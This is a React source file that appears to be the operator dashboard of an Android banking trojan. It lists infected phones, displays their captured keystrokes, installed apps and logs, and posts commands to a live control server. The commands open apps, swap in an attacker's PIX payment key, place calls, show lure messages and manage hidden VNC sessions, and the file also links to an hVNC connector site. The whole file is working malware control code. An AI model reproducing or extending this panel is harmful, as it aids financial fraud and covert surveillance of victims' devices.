import { format } from "date-fns";
import toast from "react-hot-toast";
import PropTypes from "prop-types";
import ArrowRightIcon from "@heroicons/react/24/solid/ArrowRightIcon";
import {
  ImAccessibility,
  ImAndroid,
  ImMagicWand,
  ImKeyboard,
  ImHammer,
  ImPhone,
  ImEyePlus,
  ImMobile2,
} from "react-icons/im";
import { FaP, FaPix } from "react-icons/fa6";
import { RiMessageFill } from "react-icons/ri";
import { useEffect, useState } from "react";
import { Modal } from "pretty-modal";
import {
  Box,
  Button,
  Card,
  CardActions,
  CardHeader,
  Divider,
  SvgIcon,
  Table,
  TableBody,
  TableCell,
  TableHead,
  TextField,
  TableRow,
} from "@mui/material";
import { Scrollbar } from "src/components/scrollbar";
import { SeverityPill } from "src/components/severity-pill";
import { AuthContext } from "src/contexts/auth-context";
import { useContext } from "react";

const statusMap = {
  pending: "warning",
  delivered: "success",
  refunded: "error",
};

export const OverviewAllUsers = (props) => {
  const { user } = useContext(AuthContext);
  const [p1isOpen, p1setIsOpen] = useState(null);
  const [p2isOpen, p2setIsOpen] = useState(null);
  const [p3isOpen, p3setIsOpen] = useState(null);
  const [p4isOpen, p4setIsOpen] = useState(null);
  const [p5isOpen, p5setIsOpen] = useState(null);
  const [p6isOpen, p6setIsOpen] = useState(null);
  const [p7isOpen, p7setIsOpen] = useState(null);
  const [p8isOpen, p8setIsOpen] = useState(null);
  const [p9isOpen, p9setIsOpen] = useState(null);

  return (
    <Card>
      <Modal
        onClose={() => {
          p2setIsOpen(null);
        }}
        open={p2isOpen}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <table className="table table-hover table-nowrap align-middle mb-0">
                <thead>
                  <tr className="text-muted text-uppercase">
                    <th scope="col">APPLICATIONS INSTALLED</th>
                  </tr>
                </thead>
                <tbody>
                  {user.devices
                    ?.find((c) => c.hwid == p2isOpen)
                    ?.apps?.replace("APPLICATIONS|")
                    .replace("[")
                    .replace("]")
                    .replace("undefined", "")
                    .split("|")
                    .map((app, index) => (
                      <p key={index}>{app}</p>
                    ))}
                </tbody>
              </table>
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p2setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>
            </div>
          </div>
        </div>
      </Modal>
      <Modal
        onClose={() => {
          p1setIsOpen(null);
        }}
        open={p1isOpen}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <table className="table table-hover table-nowrap align-middle mb-0">
                <thead>
                  <tr className="text-muted text-uppercase">
                    <th scope="col">LOGS</th>
                  </tr>
                </thead>
                <tbody>
                  {user.devices
                    ?.filter((c) => c.hwid === p1isOpen)
                    ?.map((device) => (
                      <div key={device}>
                        {user.devices
                          ?.filter((c) => c.hwid === p1isOpen)
                          ?.map((device) => (
                            <div key={device}>
                              {device.dlogs &&
                                Array.isArray(device.dlogs) &&
                                device.dlogs.map((item, index) => (
                                  <p key={index}>{item.replace("DLOGS|", "")}</p>
                                ))}
                            </div>
                          ))}
                      </div>
                    ))}
                </tbody>
              </table>
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p1setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>
            </div>
          </div>
        </div>
      </Modal>
      <Modal
        onClose={() => {
          p3setIsOpen(null);
        }}
        open={p3isOpen}
        style={{ display: "flex", alignItems: "center", justifyContent: "center" }}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <table className="table table-hover table-nowrap align-middle mb-0">
                <thead>
                  <tr className="text-muted text-uppercase">
                    <th scope="col">CAPTURED KEYLOGS</th>
                  </tr>
                </thead>
                <tbody>
                  {user.devices
                    ?.filter((c) => c.hwid === p3isOpen)
                    ?.map((device) => (
                      <div key={device}>
                        {device.keylog &&
                          Array.isArray(device.keylog) &&
                          device.keylog.map((item, index) => (
                            <p key={index} style={{ textAlign: "center", whiteSpace: "pre-wrap" }}>
                              {item.replace("KEYLOG|", "")}
                            </p>
                          ))}
                      </div>
                    ))}
                </tbody>
              </table>
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p3setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>
            </div>
          </div>
        </div>
      </Modal>
      <Modal
        onClose={() => {
          p4setIsOpen(null);
        }}
        open={p4isOpen}
        style={{ display: "flex", alignItems: "center", justifyContent: "center" }}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <tr className="text-muted text-uppercase">
                <th scope="col">OPEN APPLICATION</th>
              </tr>

              <TextField
                helperText="Please, insert only packagename"
                label="Package Name"
                name="packagename"
                id="packagename"
                required
              />
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p4setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>

              <Button
                variant="contained"
                style={{ marginLeft: "10px" }}
                onClick={(e) => {
                  let packagename = document.getElementById("packagename").value;

                  if (packagename == null) {
                    toast.success("Insert package !", {
                      style: {
                        border: "1px solid #d40004",
                        padding: "16px",
                        color: "#d40004",
                        background: "transparent",
                      },
                      iconTheme: {
                        primary: "#d40004",
                        secondary: "#FFFAEE",
                      },
                    });
                  }

                  e.preventDefault();

                  fetch("https://api.droidweb.net/send", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      hwid: p4isOpen,
                      content: "OPEN|" + packagename,
                    }),
                  })
                    .catch((_) => {
                      toast.success("Error to send command to the device", {
                        style: {
                          border: "1px solid #d40004",
                          padding: "16px",
                          color: "#d40004",
                          background: "transparent",
                        },
                        iconTheme: {
                          primary: "#d40004",
                          secondary: "#FFFAEE",
                        },
                      });
                    })
                    .then((res) => res?.json())
                    .then((res) => {
                      if (res.status == "success") {
                        toast.success("Command sent successfully to the device", {
                          style: {
                            border: "1px solid #059e00",
                            padding: "16px",
                            color: "#059e00",
                            background: "transparent",
                          },
                          iconTheme: {
                            primary: "#059e00",
                            secondary: "#FFFAEE",
                          },
                        });
                      } else if (res.message == "Invalid device") {
                        toast.success("Device is no longer on the network!", {
                          style: {
                            border: "1px solid #d40004",
                            padding: "16px",
                            color: "#d40004",
                            background: "transparent",
                          },
                          iconTheme: {
                            primary: "#d40004",
                            secondary: "#FFFAEE",
                          },
                        });
                      } else {
                        toast.success("Error to send command to the device", {
                          style: {
                            border: "1px solid #d40004",
                            padding: "16px",
                            color: "#d40004",
                            background: "transparent",
                          },
                          iconTheme: {
                            primary: "#d40004",
                            secondary: "#FFFAEE",
                          },
                        });
                      }
                    });
                }}
              >
                EXECUTE
              </Button>
            </div>
          </div>
        </div>
      </Modal>
      <Modal
        onClose={() => {
          p5setIsOpen(null);
        }}
        open={p5isOpen}
        style={{ display: "flex", alignItems: "center", justifyContent: "center" }}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <tr className="text-muted text-uppercase">
                <th scope="col">UPDATE PIX</th>
              </tr>

              <TextField
                helperText="Insert your PIX Key"
                label="pix@sicko.devz"
                name="packagename"
                id="packagename"
                required
              />
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p5setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>

              <Button
                variant="contained"
                style={{ marginLeft: "10px" }}
                onClick={(e) => {
                  let packagename = document.getElementById("packagename").value;

                  if (packagename == null) {
                    toast.error("Insert PIX");
                  }

                  e.preventDefault();

                  fetch("https://api.droidweb.net/send", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      hwid: p5isOpen,
                      content: "UPDATEPIX|" + packagename,
                    }),
                  })
                    .catch((_) => {
                      toast.error("Error to send command to the device");
                    })
                    .then((res) => res?.json())
                    .then((res) => {
                      if (res.status == "success") {
                        toast.success("Success");
                      } else if (res.message == "Invalid device") {
                        toast.error("Device longer on network");
                      } else {
                        toast.error("Error to send command");
                      }
                    });
                }}
              >
                EXECUTE
              </Button>
            </div>
          </div>
        </div>
      </Modal>

      <Modal
        onClose={() => {
          p6setIsOpen(null);
        }}
        open={p6isOpen}
        style={{ display: "flex", alignItems: "center", justifyContent: "center" }}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <tr className="text-muted text-uppercase">
                <th scope="col">CALL NUMBER</th>
              </tr>

              <TextField
                helperText="Example: +5511999999999"
                label="+5511999999999"
                name="packagename"
                id="packagename"
                required
              />
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p6setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>

              <Button
                variant="contained"
                style={{ marginLeft: "10px" }}
                onClick={(e) => {
                  let packagename = document.getElementById("packagename").value;

                  if (packagename == null) {
                    toast.error("Insert Number");
                  }

                  e.preventDefault();

                  fetch("https://api.droidweb.net/send", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      hwid: p6isOpen,
                      content: "CALL|" + packagename,
                    }),
                  })
                    .catch((_) => {
                      toast.error("Error to send command to the device");
                    })
                    .then((res) => res?.json())
                    .then((res) => {
                      if (res.status == "success") {
                        toast.success("Success");
                      } else if (res.message == "Invalid device") {
                        toast.error("Device longer on network");
                      } else {
                        toast.error("Error to send command");
                      }
                    });
                }}
              >
                EXECUTE
              </Button>
            </div>
          </div>
        </div>
      </Modal>

      <Modal
        onClose={() => {
          p7setIsOpen(null);
        }}
        open={p7isOpen}
        style={{ display: "flex", alignItems: "center", justifyContent: "center" }}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <tr className="text-muted text-uppercase">
                <th scope="col">BOT MANAGER</th>
              </tr>
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p7setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>

              <Button
                variant="contained"
                style={{ marginLeft: "10px" }}
                onClick={(e) => {
                  e.preventDefault();
                  fetch("https://api.droidweb.net/send", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      hwid: p7isOpen,
                      content: "REMOVEOVERLAYS",
                    }),
                  })
                    .catch((_) => {
                      toast.error("Error to send command to the device");
                    })
                    .then((res) => res?.json())
                    .then((res) => {
                      if (res.status == "success") {
                        toast.success("Success");
                      } else if (res.message == "Invalid device") {
                        toast.error("Device longer on network");
                      } else {
                        toast.error("Error to send command");
                      }
                    });
                }}
              >
                REMOVE SCREEN
              </Button>
            </div>
          </div>
        </div>
      </Modal>

      <Modal
        onClose={() => {
          p8setIsOpen(null);
        }}
        open={p8isOpen}
        style={{ display: "flex", alignItems: "center", justifyContent: "center" }}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <tr className="text-muted text-uppercase">
                <th scope="col">SHOW TOAST MESSAGE</th>
              </tr>

              <TextField
                helperText="Example: Open PayPal"
                label="Insert Message"
                name="packagename"
                id="packagename"
                required
              />
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p8setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>

              <Button
                variant="contained"
                style={{ marginLeft: "10px" }}
                onClick={(e) => {
                  let packagename = document.getElementById("packagename").value;

                  if (packagename == null) {
                    toast.error("Insert Message");
                  }

                  e.preventDefault();

                  fetch("https://api.droidweb.net/send", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      hwid: p8isOpen,
                      content: "SHOWMSG|" + packagename,
                    }),
                  })
                    .catch((_) => {
                      toast.error("Error to send command to the device");
                    })
                    .then((res) => res?.json())
                    .then((res) => {
                      if (res.status == "success") {
                        toast.success("Success");
                      } else if (res.message == "Invalid device") {
                        toast.error("Device longer on network");
                      } else {
                        toast.error("Error to send command");
                      }
                    });
                }}
              >
                EXECUTE
              </Button>
            </div>
          </div>
        </div>
      </Modal>

      <Modal
        onClose={() => {
          p9setIsOpen(null);
        }}
        open={p9isOpen}
        style={{ display: "flex", alignItems: "center", justifyContent: "center" }}
      >
        <div className="custom-modal">
          <div className="modal-content">
            <div
              className="modal-body"
              style={{ maxHeight: "70vh", maxWidth: "100vh", overflowY: "auto" }}
            >
              <table className="table table-hover table-nowrap align-middle mb-0">
                <thead>
                  <tr className="text-muted text-uppercase">
                    <th scope="col">VNC</th>
                  </tr>
                </thead>
                <tbody>
                  {user.devices
                    ?.filter((c) => c.hwid === p9isOpen)
                    ?.map((device) => (
                      <div key={device}>
                        {device.vncparams &&
                          Array.isArray(device.vncparams) &&
                          device.vncparams.map((item, index) => (
                            <p key={index}>{item.replace("VNCPARAMS|", "")}</p>
                          ))}
                      </div>
                    ))}
                </tbody>
              </table>
            </div>
            <div className="modal-footer">
              <Button
                onClick={() => {
                  p9setIsOpen(null);
                }}
                variant="contained"
              >
                EXIT
              </Button>

              <Button
                variant="contained"
                onClick={() => (window.location.href = "https://hvnc.criminalmw.fun")}
              >
                CONNECTOR
              </Button>

              <Button
                variant="contained"
                style={{ marginLeft: "10px" }}
                onClick={(e) => {
                  e.preventDefault();
                  fetch("https://api.droidweb.net/send", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      hwid: p9isOpen,
                      content: "RESTARTVNC",
                    }),
                  })
                    .catch((_) => {
                      toast.error("Error to send command to the device");
                    })
                    .then((res) => res?.json())
                    .then((res) => {
                      if (res.status == "success") {
                        toast.success("Success");
                      } else if (res.message == "Invalid device") {
                        toast.error("Device longer on network");
                      } else {
                        toast.error("Error to send command");
                      }
                    });
                }}
              >
                RESTART VNC
              </Button>
            </div>
          </div>
        </div>
      </Modal>

      <Scrollbar>
        <Box sx={{ minWidth: 800 }}>
          <Table>
            <TableHead>
              <TableRow>
                <TableCell padding="checkbox">Hwid</TableCell>
                <TableCell>Model</TableCell>
                <TableCell sortDirection="desc">Manufacturer</TableCell>
                <TableCell>Android Version</TableCell>
                <TableCell>Infected Date</TableCell>
                <TableCell>Status</TableCell>
                <TableCell>Accessibility</TableCell>
                <TableCell></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {user.devices &&
                user.devices
                  .sort((a, b) => {
                    if (a.online) {
                      return -1;
                    }
                    return 1;
                  })
                  .map((device, i) => {
                    let infectedAttt;
                    try {
                      infectedAttt = device.infectedat
                        ? format(device.infectedat, "dd/MM/yyyy")
                        : "Data Unknown";
                    } catch (error) {}

                    return (
                      <TableRow hover key="123">
                        <TableCell>
                          <img
                            alt=""
                            src="https://images-platform.99static.com/uacu1ujT99RBPkVCJn3qCzU_8aQ=/500x500/top/smart/99designs-contests-attachments/20/20691/attachment_20691238"
                            style={{ borderRadius: "50%", width: "0px" }} // Apply the inline style directly
                          />
                          {device.hwid}
                        </TableCell>
                        <TableCell>{device.model}</TableCell>
                        <TableCell>{device.manufacturer}</TableCell>
                        <TableCell>
                          <SeverityPill>{device.version}</SeverityPill>
                        </TableCell>
                        <TableCell>
                          {new Date(parseInt(device.infectedat)).toLocaleString()}
                        </TableCell>
                        <TableCell>
                          <SeverityPill>
                            {(!device.online && <a> OFFLINE </a>) || <a> ONLINE </a>}
                          </SeverityPill>
                        </TableCell>
                        <TableCell>
                          {device.botstatus === "" ? (
                            <SvgIcon color="red">
                              <ImAccessibility color="red" />
                            </SvgIcon>
                          ) : device.botstatus === "WAITING" ? (
                            <SvgIcon color="red">
                              <ImAccessibility color="red" />
                            </SvgIcon>
                          ) : (
                            <SvgIcon>
                              <ImAccessibility color="#868DDC" />
                            </SvgIcon>
                          )}
                        </TableCell>
                        <TableCell>
                          <a
                            onClick={() => {
                              device.online && p2setIsOpen(device.hwid);
                            }}
                            className={device.online ? "btn" : "btn disabled"}
                            style={{ color: "#fff", padding: "10px" }}
                          >
                            <SvgIcon width="100px">
                              <ImAndroid color="#868DDC" />
                            </SvgIcon>
                          </a>

                          <a
                            onClick={() => {
                              device.online && p1setIsOpen(device.hwid);
                            }}
                            className={device.online ? "btn" : "btn disabled"}
                            style={{ color: "#fff", padding: "10px" }}
                          >
                            <SvgIcon width="100px" style={{ marginLeft: "10px" }}>
                              <ImMagicWand color="#868DDC" />
                            </SvgIcon>
                          </a>

                          <a
                            onClick={() => {
                              device.online && p3setIsOpen(device.hwid);
                            }}
                            className={device.online ? "btn" : "btn disabled"}
                            style={{ color: "#fff", padding: "10px" }}
                          >
                            <SvgIcon width="100px">
                              <ImKeyboard color="#868DDC" />
                            </SvgIcon>
                          </a>

                          <a
                            onClick={() => {
                              device.online && p4setIsOpen(device.hwid);
                            }}
                            className={device.online ? "btn" : "btn disabled"}
                            style={{ color: "#fff", padding: "10px" }}
                          >
                            <SvgIcon width="100px">
                              <ImHammer color="#868DDC" />
                            </SvgIcon>
                          </a>

                          <a
                            onClick={() => {
                              device.online && p5setIsOpen(device.hwid);
                            }}
                            className={device.online ? "btn" : "btn disabled"}
                            style={{ color: "#fff", padding: "10px" }}
                          >
                            <SvgIcon width="100px">
                              <FaPix color="#33bdad" />
                            </SvgIcon>
                          </a>

                          <a
                            onClick={() => {
                              device.online && p6setIsOpen(device.hwid);
                            }}
                            className={device.online ? "btn" : "btn disabled"}
                            style={{ color: "#fff", padding: "10px" }}
                          >
                            <SvgIcon width="100px">
                              <ImPhone color="#33bdad" />
                            </SvgIcon>
                          </a>

                          <a
                            onClick={() => {
                              device.online && p7setIsOpen(device.hwid);
                            }}
                            className={device.online ? "btn" : "btn disabled"}
                            style={{ color: "#fff", padding: "10px" }}
                          >
                            <SvgIcon width="100px">
                              <ImEyePlus color="#33bdad" />
                            </SvgIcon>
                          </a>

                          <a
                            onClick={() => {
                              device.online && p8setIsOpen(device.hwid);
                            }}
                            className={device.online ? "btn" : "btn disabled"}
                            style={{ color: "#fff", padding: "10px" }}
                          >
                            <SvgIcon width="100px">
                              <RiMessageFill color="#33bdad" />
                            </SvgIcon>
                          </a>

                          {user.spartan && device.online && (
                            <a
                              onClick={() => p9setIsOpen(device.hwid)}
                              className="btn"
                              style={{ color: "#fff", padding: "10px" }}
                            >
                              <SvgIcon width="100px">
                                <ImMobile2 color="#FFD700" />
                              </SvgIcon>
                            </a>
                          )}
                        </TableCell>
                      </TableRow>
                    );
                  })}
            </TableBody>
          </Table>
        </Box>
      </Scrollbar>
      <Divider />
      <CardActions sx={{ justifyContent: "flex-end" }}>
        <Button
          color="inherit"
          endicon={
            <SvgIcon fontSize="small">
              <ArrowRightIcon />
            </SvgIcon>
          }
          size="small"
          variant="text"
        >
          View all
        </Button>
      </CardActions>
    </Card>
  );
};

OverviewAllUsers.prototype = {
  orders: PropTypes.array,
  sx: PropTypes.object,
};
